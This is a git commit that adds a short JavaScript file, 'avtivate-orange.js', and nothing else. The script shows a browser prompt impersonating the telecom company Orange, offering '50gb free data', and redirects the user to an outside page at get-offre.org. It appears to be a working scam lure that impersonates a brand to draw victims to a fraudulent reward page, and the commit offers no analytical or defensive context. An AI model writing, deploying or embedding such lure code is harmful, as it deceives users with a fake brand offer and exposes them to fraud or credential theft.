564501fac4cc3fe69bdaf5bf6bd0d55c81a5a238
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-08-06 16:05:41 -0700

    Create avtivate-orange.js

---
+++ avtivate-orange.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('ORANGE: Dear customer, Kindly activate your 50gb free data From TeamOrangeRunning, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://get-offre.org/orange-reward.html';
+}
